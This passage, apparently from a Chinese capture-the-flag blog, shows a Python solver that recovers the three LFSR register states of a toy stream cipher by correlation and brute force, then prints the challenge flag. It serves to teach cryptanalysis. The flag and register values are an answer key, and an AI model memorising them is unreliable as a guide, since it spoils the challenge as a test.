class="line">            possible, percent = R1, per</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> per &amp;gt; <span class="number">0.7</span>:</span><br><span class="line">            print(<span class="string">'R1: '</span> + hex(R1) + <span class="string">'\tpercentage: '</span> + str(per * <span class="number">100</span>) + <span class="string">'%'</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'R1 max:'</span>,hex(possible), percent)</span><br><span class="line">    <span class="keyword">return</span> possible</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破R2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_r3</span><span class="params">()</span>:</span></span><br><span class="line">    possible = <span class="number">0</span></span><br><span class="line">    percent = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R3 <span class="keyword">in</span> range(pow(<span class="number">2</span>, <span class="number">20</span>), pow(<span class="number">2</span>, <span class="number">21</span>)):</span><br><span class="line">        ret = single_lfsr(R3, R3_mask)</span><br><span class="line">        per = count(ret)</span><br><span class="line">        <span class="keyword">if</span> per &amp;gt; percent:</span><br><span class="line">            possible, percent = R3, per</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> per &amp;gt; <span class="number">0.7</span>:</span><br><span class="line">            print(<span class="string">'R3: '</span> + hex(R3) + <span class="string">'\tpercentage: '</span> + str(per * <span class="number">100</span>) + <span class="string">'%'</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'R3 max:'</span>,hex(possible), percent)</span><br><span class="line">    <span class="keyword">return</span> possible</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟部分加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(R1, R2, R3)</span>:</span></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            (R1, R2, R3, out) = single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask)</span><br><span class="line">            tmp = (tmp &amp;lt;&amp;lt; <span class="number">1</span>) ^ out</span><br><span class="line">        ret.append(tmp)</span><br><span class="line">    <span class="keyword">return</span> bytes(ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破R2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_r2</span><span class="params">(R1, R3)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R2 <span class="keyword">in</span> range(pow(<span class="number">2</span>, <span class="number">18</span>), pow(<span class="number">2</span>, <span class="number">19</span>)):</span><br><span class="line">        ret = encrypt(R1, R2, R3)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ret == cipher:</span><br><span class="line">            print(<span class="string">'R2:'</span>,R2)</span><br><span class="line">            <span class="keyword">return</span> R2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试的长度（小于32可能得到错误的结果）</span></span><br><span class="line">length = <span class="number">32</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./output/0'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read(length)</span><br><span class="line"></span><br><span class="line">R1_mask = <span class="number">0x10020</span></span><br><span class="line">R2_mask = <span class="number">0x4100c</span></span><br><span class="line">R3_mask = <span class="number">0x100002</span></span><br><span class="line"><span class="comment"># R1、R2、R3的十六进制值在flag中为6为</span></span><br><span class="line">R_len = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R1 = guess_r1()</span><br><span class="line"><span class="comment"># R1 = 0x1b9cb</span></span><br><span class="line"></span><br><span class="line">R3 = guess_r3()</span><br><span class="line"><span class="comment"># R3 = 0x16b2f3</span></span><br><span class="line"></span><br><span class="line">R2 = solve_r2(R1, R3)</span><br><span class="line"><span class="comment"># R2 = 0x5979c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 补足6位</span></span><br><span class="line">R1 = hex(R1)[<span class="number">2</span>:].zfill(R_len)</span><br><span class="line">R2 = hex(R2)[<span class="number">2</span>:].zfill(R_len)</span><br><span class="line">R3 = hex(R3)[<span class="number">2</span>:].zfill(R_len)</span><br><span class="line">flag = R1 + R2 + R3</span><br><span class="line"></span><br><span class="line">print(<span class="string">'flag&#123;'</span>+flag+<span class="string">'&#125;'</span>)</span><br><span class="line"><span class="comment"># flag=&#123;01b9cb05979c16b2f3&#125;</span></span><br></pre></td></tr></table></figure><p>跑脚本需要一定的时间，需要耐心等待，在我电脑上约为18分钟。</p>]]></content>
      
      
      
    </entry>
    
  
  
</search>
